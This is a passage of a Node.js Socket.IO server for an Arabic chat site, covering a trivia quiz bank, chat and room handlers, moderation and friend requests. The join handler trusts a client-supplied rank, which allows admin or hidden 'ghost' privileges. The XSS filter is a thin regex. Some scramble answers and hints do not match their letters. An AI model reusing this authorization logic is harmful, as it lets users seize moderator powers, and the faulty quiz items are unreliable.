  {q:'من اخترع المصباح الكهربائي؟',a:'إديسون',hint:'إدي_ون',points:40},
  // رياضيات
  {q:'كم هو ناتج 15 × 15؟',a:'225',hint:'2_5',points:50},
  {q:'كم هو جذر 144؟',a:'12',hint:'1_',points:40},
  {q:'كم هو ناتج 7 × 8؟',a:'56',hint:'5_',points:20},
  {q:'كم هو ناتج 12 × 12؟',a:'144',hint:'1_4',points:30},
  {q:'كم هو جذر 256؟',a:'16',hint:'1_',points:50},
  {q:'ما هو العدد الأولي بين 10 و 15؟',a:'11',hint:'1_',points:40},
  {q:'كم هو ناتج 9 × 9؟',a:'81',hint:'8_',points:20},
  {q:'كم هو ناتج 25 × 4؟',a:'100',hint:'1_0',points:30},
  // رياضة
  {q:'كم عدد لاعبي كرة القدم في كل فريق؟',a:'11',hint:'1_',points:20},
  {q:'في أي دولة أقيمت كأس العالم 2022؟',a:'قطر',hint:'ق_ر',points:30},
  {q:'ما الملقب بـ"الملك" في كرة القدم؟',a:'بيليه',hint:'ب_لة',points:40},
  {q:'كم دورة أولمبية تقام كل سنوات؟',a:'4',hint:'_',points:20},
  {q:'ما عدد الجولات في الملاكمة الاحترافية؟',a:'12',hint:'1_',points:40},
  // ثقافة عامة
  {q:'ما أطول سور في العالم؟',a:'سور الصين العظيم',hint:'سور ال_ين الع_يم',points:30},
  {q:'ما عدد أيام شهر فبراير في السنة العادية؟',a:'28',hint:'2_',points:20},
  {q:'ما هو الميتال الأكثر مرونة؟',a:'الذهب',hint:'الذ_ب',points:50},
  {q:'ما أكبر الدول العربية مساحة؟',a:'الجزائر',hint:'الج_ائر',points:40},
  {q:'ما اسم الكتاب المقدس عند المسلمين؟',a:'القرآن',hint:'الق_آن',points:20},
  {q:'كم يبلغ عمر الكون تقريباً بالمليار سنة؟',a:'13.8',hint:'13._',points:90},
  {q:'ما أغلى معدن في العالم؟',a:'الروديوم',hint:'الرو_يوم',points:80},
  {q:'في أي مدينة يقع برج إيفل؟',a:'باريس',hint:'با_يس',points:20},
  {q:'ما عاصمة أستراليا؟',a:'كانبيرا',hint:'كان_را',points:60},
  {q:'ما أصغر دولة في العالم؟',a:'الفاتيكان',hint:'الفا_كان',points:50},
  // بعثرة حروف
  {q:'بعثرة حروف: وسن',a:'سون',type:'scramble',points:90},
  {q:'بعثرة حروف: ابحر',a:'حرب',type:'scramble',points:70},
  {q:'بعثرة حروف: لامج',a:'جمال',type:'scramble',points:70},
  {q:'بعثرة حروف: نيدم',a:'مدين',type:'scramble',points:70},
  {q:'بعثرة حروف: رحس',a:'سحر',type:'scramble',points:60},
  {q:'بعثرة حروف: كلم',a:'ملك',type:'scramble',points:60},
  {q:'بعثرة حروف: ردب',a:'بدر',type:'scramble',points:60},
  {q:'بعثرة حروف: ليل',a:'ليل',type:'scramble',points:50},
  {q:'بعثرة حروف: بلق',a:'قلب',type:'scramble',points:50},
  {q:'بعثرة حروف: مسج',a:'جسم',type:'scramble',points:50},
  {q:'بعثرة حروف: ابت',a:'باب',type:'scramble',points:40},
  {q:'بعثرة حروف: رهن',a:'نهر',type:'scramble',points:60},
];

const quizState = {};
function shuffleArr(arr) { const a=[...arr]; for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }

function getAllQuizQuestions() {
  // Merge built-in + admin questions, shuffle each time
  return shuffleArr([...QUIZ_QUESTIONS, ...adminQuizQuestions]);
}

function startQuiz(roomId) {
  if (!quizState[roomId]) quizState[roomId]={active:false,current:null,timer:null,hintTimer:null,pool:[],idx:0,usedIds:new Set()};
  const s=quizState[roomId];
  if (s.active) return;
  s.active=true;
  s.pool = getAllQuizQuestions();
  s.idx = 0;
  s.usedIds = new Set();
  nextQuestion(roomId);
}
function stopQuiz(roomId) {
  const s=quizState[roomId]; if (!s) return;
  s.active=false;
  if (s.timer) clearTimeout(s.timer);
  if (s.hintTimer) clearTimeout(s.hintTimer);
  s.current=null;
}
async function addPoints(username,pts) {
  if (useDB) await db.query('UPDATE users SET points=points+$1 WHERE username=$2',[pts,username]);
  else if (memUsers[username]) memUsers[username].points=(memUsers[username].points||0)+pts;
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { chatUsers[sid].points=(chatUsers[sid].points||0)+pts; io.to(sid).emit('points-updated',{points:chatUsers[sid].points}); }
}
function nextQuestion(roomId) {
  const s=quizState[roomId]; if (!s||!s.active) return;
  s.timer=setTimeout(async()=>{
    if (!s.active) return;
    if (s.idx>=s.pool.length){
      // Reshuffle combining all questions when pool exhausted
      s.pool=getAllQuizQuestions();
      s.idx=0;
    }
    const q=s.pool[s.idx++]; s.current={...q,answered:false};
    const qMsg=await saveMessage(roomId,'مسابقات',`سؤآل : ${q.q}`,'quiz');
    io.to(roomId).emit('message',{...qMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
    if (q.hint&&q.type!=='scramble') {
      s.hintTimer=setTimeout(async()=>{
        if (s.current&&!s.current.answered){
          const hMsg=await saveMessage(roomId,'مسابقات',`مساعده : ${q.hint}`,'quiz');
          io.to(roomId).emit('message',{...hMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        }
      },20000);
    }
    s.timer=setTimeout(async()=>{
      if (s.current&&!s.current.answered){
        s.current.answered=true;
        const noMsg=await saveMessage(roomId,'مسابقات',`نأسف لم يتم الإجآبة على هذا السؤال : الإجآبة هي ${q.a}`,'quiz');
        io.to(roomId).emit('message',{...noMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        nextQuestion(roomId);
      }
    },40000);
  },6000);
}
function checkAnswer(roomId,username,text) {
  const s=quizState[roomId];
  if (!s||!s.current||s.current.answered) return false;
  const a=normalizeAr(s.current.a.toLowerCase().trim());
  const u=normalizeAr(text.toLowerCase().trim());
  if (a===u) { s.current.answered=true; if (s.hintTimer) clearTimeout(s.hintTimer); if (s.timer) clearTimeout(s.timer); return s.current; }
  return false;
}
setTimeout(()=>{ if (ROOMS['competitions']) startQuiz('competitions'); },3000);

// ===== SOCKET =====
const chatUsers = {};

// ===== IDLE USER CHECKER =====
// يفحص كل 5 دقائق - يخرج فقط من لم يتفاعل منذ 8 ساعات (لضمان بقاء الأعضاء أون لاين)
const IDLE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 ساعات
setInterval(async () => {
  const now = Date.now();
  for (const [sid, user] of Object.entries(chatUsers)) {
    if (user.rank === 'ghost') continue;
    const lastAct = user.lastActivity || user.joinTime || now;
    if (now - lastAct >= IDLE_TIMEOUT) {
      const room = user.room;
      const userName = user.name;
      delete chatUsers[sid];
      const sock = io.sockets.sockets.get(sid);
      if (sock) sock.disconnect(true);
      const msg = await saveMessage(room, null, `⏱️ ${userName} خرج بسبب عدم النشاط`, 'system');
      io.to(room).emit('message', msg);
      io.to(room).emit('room-users', getRoomUsers(room));
      io.emit('online-count', getOnlineCount());
      broadcastRoomCounts();
    }
  }
}, 5 * 60 * 1000);
// ===== END IDLE CHECKER =====
const mutedUsers = new Set();
const voiceRooms = {};
const warnCount = {}; // global scope - يمكن للـ API الوصول إليه
const rateLimits = {};
const lastMessages = {};

function kickUser(username,reason) {
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { io.to(sid).emit('kicked',reason); setTimeout(()=>io.sockets.sockets.get(sid)?.disconnect(),500); }
}
function getTime() { const n=new Date(); return n.toLocaleTimeString('ar-IQ',{timeZone:'Asia/Baghdad',hour:'2-digit',minute:'2-digit',hour12:true}); }
function getRoomUsers(r) {
  return Object.values(chatUsers)
    .filter(u => u.room === r && u.rank !== 'ghost')
    .map(u => {
      const avatar = u.avatar || (memProfiles[u.name] && memProfiles[u.name].avatar) || null;
      const avatar_shape = u.avatar_shape || (memProfiles[u.name] && memProfiles[u.name].avatar_shape) || 'circle';
      return { ...u, avatar, avatar_shape };
    });
}

function getRoomUsersCount(r) {
  // For counts, also exclude ghost
  return Object.values(chatUsers).filter(u => u.room === r && u.rank !== 'ghost').length;
}
async function saveMessage(room,username,text,type='chat',rank=null) {
  const msg={room,username,text,type,time:getTime(),rank};
  if (useDB) await db.query('INSERT INTO messages (room,username,text,type) VALUES ($1,$2,$3,$4)',[room,username,text,type]);
  else { memMessages[room]=memMessages[room]||[]; memMessages[room].push(msg); if (memMessages[room].length>50) memMessages[room].shift(); }
  return msg;
}
function broadcastRoomCounts() {
  const counts = {};
  Object.keys(ROOMS).forEach(r => { counts[r] = getRoomUsersCount(r); });
  io.emit('room-counts', counts);
}

function getOnlineCount() {
  return Object.values(chatUsers).filter(u => u.rank !== 'ghost').length;
}

io.on('connection', (socket) => {
  // معالجة إعادة الانضمام السريع (عند العودة من تطبيق آخر)
  // استقبال ping النشاط من العميل - يمنع الإخراج بسبب الخمول
  socket.on('activity-ping', () => {
    const user = chatUsers[socket.id];
    if (user) user.lastActivity = Date.now();
  });

  socket.on('rejoin', ({ user, room }) => {
    if (!user || !chatUsers[socket.id]) return;
    // تحديث بيانات المستخدم في السيرفر
    if (chatUsers[socket.id]) {
      chatUsers[socket.id].room = room || chatUsers[socket.id].room;
    }
    // إرسال قائمة المستخدمين المحدثة
    const r = chatUsers[socket.id]?.room;
    if (r) {
      io.to(r).emit('room-users', getRoomUsers(r));
      io.emit('online-count', getOnlineCount());
    }
  });

  socket.on('join', async (data) => {
    const nameCheck=data.name||'';
    if (containsBadUsername(nameCheck)||containsBadWordFull(nameCheck).found) { socket.emit('username-rejected','❌ الاسم غير مقبول'); return; }
    if (nameCheck.trim().length<2||nameCheck.trim().length>20) { socket.emit('username-rejected','❌ الاسم يجب أن يكون بين 2 و 20 حرف'); return; }
    const rank=data.rank||'visitor';
    const rankInfo=RANKS[rank]||RANKS['visitor'];

    // ===== منع الدخول المزدوج =====
    const existingSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.name && id !== socket.id);
    if (existingSid) {
      const oldUser = chatUsers[existingSid];
      const oldRoom = oldUser?.room;
      const oldJoinTime = oldUser?.joinTime || 0;
      // احذف الجلسة القديمة فوراً من chatUsers
      delete chatUsers[existingSid];
      if (oldRoom) io.to(oldRoom).emit('room-users', getRoomUsers(oldRoom));
      // إذا كانت الجلسة القديمة عمرها أقل من 8 ثوانٍ → انعاش الصفحة → لا نرسل kicked
      // فقط نقطع الاتصال بهدوء
      const sessionAge = Date.now() - oldJoinTime;
      if (sessionAge < 8000) {
        // انعاش — فقط أغلق الـ socket القديم بهدوء بدون kicked
        setTimeout(() => {
          const oldSock = io.sockets.sockets.get(existingSid);
          if (oldSock) oldSock.disconnect();
        }, 3000);
      } else {
        // دخول حقيقي من جهاز آخر — أرسل kicked
        const oldSock = io.sockets.sockets.get(existingSid);
        if (oldSock) {
          oldSock.emit('kicked', '⚠️ تم فتح حسابك من جهاز أو تبويب آخر');
          setTimeout(() => oldSock.disconnect(), 500);
        }
      }
    }
    // ===== نهاية فحص الدخول المزدوج =====

    const goldData = await getGold(data.name);
    // Load avatar and name style from DB
    let avatarData = null, avatarShape = 'circle', nameColor = null, nameFontSize = null, nameFontFamily = null;
    if (useDB) {
      try {
        const pr = await db.query('SELECT avatar, avatar_shape FROM profiles WHERE username=$1', [data.name]);
        avatarData = pr.rows[0]?.avatar || null;
        avatarShape = pr.rows[0]?.avatar_shape || 'circle';
        const ur = await db.query('SELECT name_color,name_font_size,name_font_family FROM users WHERE username=$1',[data.name]);
        if (ur.rows[0]) { nameColor=ur.rows[0].name_color||null; nameFontSize=ur.rows[0].name_font_size||null; nameFontFamily=ur.rows[0].name_font_family||null; }
      } catch(e) {}
    } else {
      avatarData = memProfiles[data.name]?.avatar || null;
      avatarShape = memProfiles[data.name]?.avatar_shape || 'circle';
      nameColor = memUsers[data.name]?.name_color||null;
      nameFontSize = memUsers[data.name]?.name_font_size||null;
      nameFontFamily = memUsers[data.name]?.name_font_family||null;
    }
    // Use values passed from client session if DB not set
    if (!nameColor && data.nameColor) nameColor = data.nameColor;
    if (!nameFontSize && data.nameFontSize) nameFontSize = data.nameFontSize;
    if (!nameFontFamily && data.nameFontFamily) nameFontFamily = data.nameFontFamily;
    const user={id:socket.id,name:data.name,gender:data.gender||'ذكر',age:data.age||22,rank,rankInfo,room:'general',points:data.points||0,gold:goldData.gold||0,diamond:goldData.diamond||0,avatar:avatarData,avatar_shape:avatarShape,nameColor,nameFontSize,nameFontFamily,joinTime:Date.now(),lastActivity:Date.now()};
    chatUsers[socket.id]=user;
    socket.join('general');
    let history=[];
    if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',['general']);history=r.rows.reverse();}
    else history=memMessages['general']||[];
    const roomCounts={}; Object.keys(ROOMS).forEach(r=>{roomCounts[r]=getRoomUsersCount(r);});
    // Send updated ranks with custom labels
    const effectiveRanks = {};
    Object.keys(RANKS).forEach(r => { effectiveRanks[r] = {...RANKS[r], label: getRankLabel(r)}; });
    socket.emit('init',{rooms:ROOMS,user,messages:history,onlineCount:getOnlineCount(),roomCounts,ranks:effectiveRanks,callCost:callCostConfig});
    io.emit('online-count', getOnlineCount());
    broadcastRoomCounts();
    // Ghost joins silently — no messages, not visible in user list
    if (user.rank !== 'ghost') {
      const joinText=`${user.name} انضم للغرفة (# ${rankInfo.label} #)`;
      const sysMsg=await saveMessage('general',null,joinText,'system');
      io.to('general').emit('message',{...sysMsg});
      io.to('general').emit('room-users',getRoomUsers('general'));
    }
    // Send welcome message - فقط اذا طلب العميل صراحةً (أول دخول حقيقي)
    if (welcomeMessage.enabled && welcomeMessage.text && data.requestWelcome === true) {
      const wText = welcomeMessage.text.replace('{name}', data.name);
      setTimeout(() => {
        socket.emit('welcome-msg', {
          text: wText,
          senderName: welcomeMessage.senderName || 'غزل عراقي 🌹',
          time: getTime()
        });
      }, 1500);
    }

    // ===== إرسال الرسائل الخاصة الفائتة عند انضمام المستخدم =====
    // نبحث عن كل المحادثات التي تخص هذا المستخدم ونرسلها
    setTimeout(async () => {
      try {
        if (useDB) {
          const r = await db.query(
            `SELECT from_user as "from", to_user as "to", text, time,
                    COALESCE(msg_type,'private') as type,
                    media_data as "imageData", created_at 
             FROM private_messages 
             WHERE to_user=$1 OR from_user=$1
             ORDER BY created_at ASC`,
            [data.name]
          );
          if (r.rows.length > 0) {
            socket.emit('pm-history-load', { messages: r.rows });
          }
        } else {
          // من الذاكرة - نجمع كل المحادثات التي فيها هذا المستخدم
          const myConvs = [];
          for (const [key, msgs] of Object.entries(memPMs)) {
            if (key.includes(data.name)) {
              myConvs.push(...msgs);
            }
          }
          if (myConvs.length > 0) {
            socket.emit('pm-history-load', { messages: myConvs.sort((a,b)=>(a.ts||0)-(b.ts||0)) });
          }
        }
      } catch(e) {}
    }, 2000);
    // ===== نهاية إرسال الرسائل الفائتة =====
  });

  socket.on('switch-room', async (roomId) => {
    const user=chatUsers[socket.id]; if (!user||!ROOMS[roomId]) return;
    if (user.lastActivity !== undefined) user.lastActivity = Date.now(); // تحديث النشاط عند تبديل الغرفة
    // Private room access check
    const room=ROOMS[roomId];
    if (room.isPrivate && room.allowedRanks && !room.allowedRanks.includes(user.rank)){
      socket.emit('room-access-denied',{room:roomId,roomName:room.name});
      return;
    }
    const oldRoom=user.room; socket.leave(oldRoom);
    // Ghost moves silently
    if (user.rank !== 'ghost') {
      const leaveMsg=await saveMessage(oldRoom,null,`👋 ${user.name} غادر الغرفة`,'system');
      io.to(oldRoom).emit('message',leaveMsg);
    }
    io.to(oldRoom).emit('room-users',getRoomUsers(oldRoom));
    user.room=roomId; socket.join(roomId);
    let history=[];
    if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',[roomId]);history=r.rows.reverse();}
    else history=memMessages[roomId]||[];
    socket.emit('room-history',{roomId,messages:history,users:getRoomUsers(roomId)});
    if (user.rank !== 'ghost') {
      const rankInfo=RANKS[user.rank]||RANKS['visitor'];
      const joinText=`${user.name} انضم للغرفة (# ${rankInfo.label} #)`;
      const joinMsg=await saveMessage(roomId,null,joinText,'system');
      io.to(roomId).emit('message',joinMsg);
    }
    io.to(roomId).emit('room-users',getRoomUsers(roomId));
    broadcastRoomCounts();
  });

  socket.on('chat-message', async (data) => {
    const user=chatUsers[socket.id]; if (!user) return;
    if (user.lastActivity !== undefined) user.lastActivity = Date.now(); // تحديث وقت النشاط
    if (mutedUsers.has(user.name)){socket.emit('muted','أنت مكتوم');return;}
    const text=(data.text||'').trim().substring(0,300); if (!text) return;
    const now=Date.now(); const sid=socket.id;
    if (!rateLimits[sid]) rateLimits[sid]=[];
    rateLimits[sid]=rateLimits[sid].filter(t=>now-t<3000);
    if (rateLimits[sid].length>=3){socket.emit('spam-warning','⚠️ أنت ترسل رسائل بسرعة كبيرة');return;}
    rateLimits[sid].push(now);
    if (lastMessages[sid]&&lastMessages[sid].text===text&&now-lastMessages[sid].time<5000){socket.emit('spam-warning','⚠️ لا تكرر نفس الرسالة');return;}
    lastMessages[sid]={text,time:now};
    if (/<script|javascript:|on\w+=/i.test(text)){socket.emit('spam-warning','⚠️ رسالة غير مسموح بها');return;}

    // AD DETECTION
    if (detectAdLink(text)) {
      // استثناء المدير والرتب العليا
      const exemptRanks = ['owner','ghost','super_admin','owner_admin','owner_vip'];
      if (exemptRanks.includes(user.rank)) {
        // المدير يستطيع الإرسال بدون قيود
      } else {
        // كتم العضو مؤقتاً + تحذير بدل الحظر النهائي
        socket.emit('ad-warning','⚠️ تم حذف رسالتك بسبب الإشهار. سيتم كتمك إذا كررت ذلك');
        mutedUsers.add(user.name);
        io.to(user.room).emit('system-notice',`⚠️ تحذير: ${user.name} قام بالإشهار وتم كتمه`);
        return;
      }
    }

    // QUIZ ANSWER
    if (ROOMS[user.room]?.isQuiz) {
      const correct=checkAnswer(user.room,user.name,text);
      if (correct) {
        const pts=correct.points||50;
        await addPoints(user.name,pts);
        user.points=(user.points||0)+pts;
        const rankInfo=RANKS[user.rank]||RANKS['visitor'];
        // أولاً: رسالة العضو تظهر
        const uMsg=await saveMessage(user.room,user.name,text);
        io.to(user.room).emit('message',{...uMsg,user:{name:user.name,gender:user.gender,age:user.age,rank:user.rank,...rankInfo}});
        // ثانياً: رسالة الروبوت "أحسنت" بعدها مباشرة
        const successMsg=await saveMessage(user.room,'مسابقات',`🎉 أحسنت ${user.name}! الإجابة الصحيحة هي: ${correct.a} — حصلت على ${pts} نقطة 🏆 المجموع: ${user.points} نقطة`,'quiz');
        io.to(user.room).emit('message',{...successMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        nextQuestion(user.room); return;
      }
    }

    // PROFANITY
    const badCheck=containsBadWordFull(text);
    if (badCheck.found) {
      warnCount[user.name]=(warnCount[user.name]||0)+1;
      if (warnCount[user.name]>=3){mutedUsers.add(user.name);socket.emit('muted','تم كتمك تلقائياً');io.to(user.room).emit('system-notice',`⚠️ تم كتم ${user.name}`);warnCount[user.name]=0;return;}
      socket.emit('profanity-warning',{msg:`⚠️ تحذير ${warnCount[user.name]}/3`,remaining:3-warnCount[user.name]});
      return;
    }

  const rankInfo = RANKS[user.rank] || RANKS['visitor'];
  // إرسال الرسالة فوراً بدون انتظار DB
  const msg = {room:user.room, username:user.name, text, type:'chat', time:getTime(), rank:user.rank};
  // حفظ في DB بشكل غير متزامن (لا await)
  if (useDB) db.query('INSERT INTO messages (room,username,text,type,rank) VALUES ($1,$2,$3,$4,$5)',
    [user.room, user.name, text, 'chat', user.rank]).catch(()=>{});
  else { memMessages[user.room]=memMessages[user.room]||[]; memMessages[user.room].push(msg);
    if (memMessages[user.room].length>50) memMessages[user.room].shift(); }
  const textColor = typeof data.textColor==='string' && /^#[0-9a-fA-F]{3,6}$/.test(data.textColor) ? data.textColor : null;
  const nameFrame = typeof data.nameFrame==='string' && /^[a-z0-9]{1,12}$/.test(data.nameFrame) ? data.nameFrame : null;
  const userObj = {name:user.name,gender:user.gender,age:user.age,rank:user.rank,points:user.points||0,...rankInfo,avatar:user.avatar||null};
  if(textColor) userObj.textColor=textColor;
  if(nameFrame) userObj.nameFrame=nameFrame;
  const outMsg = {...msg, user:userObj};
  // إضافة بيانات التنسيق إذا وُجدت
  if (data.fmt && typeof data.fmt === 'object') {
    outMsg.fmt = {
      bold: !!data.fmt.bold,
      italic: !!data.fmt.italic,
      underline: !!data.fmt.underline,
      font: typeof data.fmt.font === 'string' ? data.fmt.font.substring(0,30) : '',
      size: typeof data.fmt.size === 'string' ? data.fmt.size.substring(0,10) : '',
    };
  }
  // إضافة بيانات الاقتباس إذا وُجدت
  if (data.quote && typeof data.quote === 'object' &&
      typeof data.quote.sender === 'string' && typeof data.quote.text === 'string') {
    outMsg.quote = {
      sender: data.quote.sender.substring(0, 50),
      text:   data.quote.text.substring(0, 200)
    };
  }
  io.to(user.room).emit('message', outMsg);
  // لا نُرسل room-users أو room-counts مع كل رسالة - يُسبب بطء
  // Earn 1 gold per message - بدون انتظار DB
  if (user.rank !== 'visitor' && user.rank !== 'ghost') {
    const cur = memGold[user.name] || {gold:0, diamond:0};
    const newGold = (cur.gold||0) + 1;
    memGold[user.name] = {gold:newGold, diamond:cur.diamond||0};
    if (useDB) _goldDirty.add(user.name);
    user.gold = newGold;
    socket.emit('gold-updated', {gold:newGold, diamond:cur.diamond||0});
  }
  });

  // ===== YOUTUBE MESSAGE =====
  socket.on('chat-youtube', async (data) => {
    const user = chatUsers[socket.id]; if (!user) return;
    if (mutedUsers.has(user.name)) return;
    if (!data.ytId || !/^[a-zA-Z0-9_-]{11}$/.test(data.ytId)) return;
    const rankInfo = RANKS[user.rank] || RANKS['visitor'];
    const msg = { room: user.room, username: user.name, text: 'yt:'+data.ytId, type: 'youtube', ytId: data.ytId, time: getTime() };
    // حفظ في قاعدة البيانات ليظهر عند الريفريش
    if (useDB) {
      await db.query('INSERT INTO messages (room,username,text,type) VALUES ($1,$2,$3,$4)',
        [user.room, user.name, 'yt:'+data.ytId, 'youtube']).catch(()=>{});
    } else {
      memMessages[user.room] = memMessages[user.room] || [];
      memMessages[user.room].push(msg);
      if (memMessages[user.room].length > 50) memMessages[user.room].shift();
    }
    const userObj = {name:user.name,gender:user.gender,age:user.age,rank:user.rank,points:user.points||0,...rankInfo,avatar:user.avatar||null};
    io.to(user.room).emit('youtube-message', {...msg, user:userObj});
  });

  // ===== CHAT IMAGE (temporary, not stored) =====
  socket.on('chat-image', async (data) => {
    const user = chatUsers[socket.id]; if (!user) return;
    if (mutedUsers.has(user.name)) return;
    if (!data.imageData || data.imageData.length > 4 * 1024 * 1024) return; // max 3MB
    if (!data.imageData.startsWith('data:image/')) return; // validate
    const rankInfo = RANKS[user.rank] || RANKS['visitor'];
    const userObj = {name:user.name,gender:user.gender,age:user.age,rank:user.rank,points:user.points||0,...rankInfo,avatar:user.avatar||null};
    const msg = { room: user.room, username: user.name, text: '', type: 'chat-image', imageData: data.imageData, imageType: data.imageType||'image', time: getTime() };
    // Broadcast to room only (not saved to DB)
    io.to(user.room).emit('chat-image-msg', {...msg, user:userObj});
  });

  // ===== STICKER / BIG EMOJI =====
  socket.on('chat-sticker', (data) => {
    const user = chatUsers[socket.id]; if (!user) return;
    if (mutedUsers.has(user.name)) return;
    const rankInfo = RANKS[user.rank] || RANKS['visitor'];
    const userObj = {name:user.name,gender:user.gender,age:user.age,rank:user.rank,points:user.points||0,...rankInfo,avatar:user.avatar||null};
    const msg = {
      room: user.room, username: user.name,
      type: data.isText ? 'chat-text-sticker' : 'chat-big-emoji',
      sticker: String(data.sticker || '').slice(0, 200),
      time: getTime()
    };
    io.to(user.room).emit('chat-sticker-msg', {...msg, user: userObj});
  });
  // ===== END STICKER =====

  // ADMIN ACTIONS
  socket.on('admin-mute',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    mutedUsers.add(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('muted',`تم كتمك من قبل ${a.name}`);
    io.emit('system-notice',`🔇 تم كتم ${data.username}`);
    logAction(a.name,a.rank,'🔇 كتم',data.username);
  });
  socket.on('admin-unmute',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    mutedUsers.delete(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('unmuted','تم رفع الكتم عنك');
    logAction(a.name,a.rank,'🔊 رفع الكتم',data.username);
  });
  socket.on('admin-kick',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canKick')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    kickUser(data.username,`تم طردك من قبل ${a.name}`); io.emit('system-notice',`🚫 تم طرد ${data.username}`);
    logAction(a.name,a.rank,'🚫 طرد',data.username);
  });
  socket.on('admin-unban', async(data) => {
    const a = chatUsers[socket.id]; if (!a || !hasPermission(a.rank,'unban')) return;
    const t = Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    if (useDB) await db.query('UPDATE users SET is_banned=FALSE,ban_reason=NULL,banned_by=NULL,banned_at=NULL WHERE username=$1',[data.username]);
    else if (memUsers[data.username]){ memUsers[data.username].is_banned=false; delete memUsers[data.username].ban_reason; }
    logAction(a.name,a.rank,'✅ رفع الحظر (socket)',data.username);
    io.emit('system-notice',`✅ تم رفع الحظر عن ${data.username}`);
  });
  socket.on('admin-ban',async(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canBan')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    if (useDB) await db.query('UPDATE users SET is_banned=TRUE WHERE username=$1',[data.username]);
    else if (memUsers[data.username]) memUsers[data.username].is_banned=true;
    const banReason = data.reason ? `\nالسبب: ${data.reason}` : '';
    kickUser(data.username,`تم حظرك من قبل ${a.name}${banReason}`); io.emit('system-notice',`🚫 تم حظر ${data.username}`);
    logAction(a.name,a.rank,'⛔ حظر',data.username);
  });
  socket.on('admin-resetwarn',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    delete warnCount[data.username]; mutedUsers.delete(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('unmuted','تم رفع الكتم وإعادة تعيين تحذيراتك');
  });

  // ===== REPORT SYSTEM =====
  socket.on('report-user', (data) => {
    const reporter = chatUsers[socket.id];
    if (!reporter || !data.reported || !data.reason) return;
    const report = {
      id: Date.now(),
      from: reporter.name,
      reported: data.reported,
      reason: data.reason,
      details: (data.details||'').substring(0, 200),
      time: getTime(),
      ts: Date.now(),
      room: reporter.room
    };
    // حفظ في قائمة البلاغات
    reportsLog.unshift(report);
    if (reportsLog.length > 500) reportsLog.pop();
    // إرسال للأدمن المتصلين
    Object.values(chatUsers).forEach(u => {
      const adminRanks = ['owner','owner_admin','owner_vip','super_admin','admin','ghost'];
      if (adminRanks.includes(u.rank)) {
        io.to(u.id).emit('new-report', report);
      }
    });
    logAction(reporter.name, reporter.rank, '🚨 بلاغ', data.reported, data.reason);
  });

  // ===== FRIEND REQUEST SYSTEM (FULL) =====
  socket.on('friend-request', async (data) => {
    const from = chatUsers[socket.id];
    if (!from || !data.to || from.name === data.to) return;
    if (useDB) {
      try {
        // هل هم أصدقاء بالفعل؟
        const u1 = [from.name, data.to].sort()[0];
        const u2 = [from.name, data.to].sort()[1];
        const existing = await db.query(
          `SELECT id FROM friends WHERE user1=$1 AND user2=$2`, [u1, u2]
        );
        if (existing.rows.length > 0) {
          socket.emit('friend-already', { to: data.to });
          return;
        }
        // هل هناك طلب معلق بالفعل؟
        const pending = await db.query(
          `SELECT id FROM friend_requests WHERE from_user=$1 AND to_user=$2 AND status='pending'`,
          [from.name, data.to]
        );
        if (pending.rows.length > 0) {
          socket.emit('friend-request-sent', { to: data.to });
          return;
        }
        await db.query(
          `INSERT INTO friend_requests (from_user, to_user, status) VALUES ($1,$2,'pending')
           ON CONFLICT (from_user, to_user) DO UPDATE SET status='pending', created_at=NOW()`,
          [from.name, data.to]
        );
      } catch(e) { console.error('friend-request DB:', e.message); }
    }
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('friend-request-incoming', { from: from.name, time: getTime() });
    socket.emit('friend-request-sent', { to: data.to });
  });

  socket.on('friend-accept', async (data) => {
    const from = chatUsers[socket.id];
    if (!from || !data.from) return;
    if (useDB) {
      try {
        await db.query(
          `UPDATE friend_requests SET status='accepted' WHERE from_user=$1 AND to_user=$2`,
          [data.from, from.name]
        );
        const u1 = [from.name, data.from].sort()[0];
        const u2 = [from.name, data.from].sort()[1];
        await db.query(`INSERT INTO friends (user1,user2) VALUES ($1,$2) ON CONFLICT DO NOTHING`, [u1, u2]);
      } catch(e) { console.error('friend-accept DB:', e.message); }
    }
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.from);
    if (toSid) io.to(toSid).emit('friend-accepted', { by: from.name });
    socket.emit('friend-accepted', { by: data.from });
  });

  socket.on('friend-reject', async (data) => {
    const from = chatUsers[socket.id];
    if (!from || !data.from) return;
    if (useDB) {
      try {
        await db.query(
          `UPDATE friend_requests SET status='rejected' WHERE from_user=$1 AND to_user=$2`,
          [data.from, from.name]
        );
